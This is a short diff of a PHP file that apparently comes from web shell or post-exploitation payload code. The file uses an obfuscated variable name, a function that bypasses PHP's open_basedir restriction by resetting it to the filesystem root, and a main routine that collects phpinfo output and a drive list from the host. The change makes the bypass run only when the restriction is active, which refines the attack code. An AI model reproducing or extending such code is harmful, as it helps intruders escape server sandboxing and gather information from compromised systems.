@@ -16,7 +16,10 @@ function bypass_open_basedir(){
     @ini_set('open_basedir','/');
     @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
 }
-bypass_open_basedir();
+if(ini_get('open_basedir')!==''){
+    bypass_open_basedir();
+}
+
 function main($whatever) {
     ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
     $driveList ="";
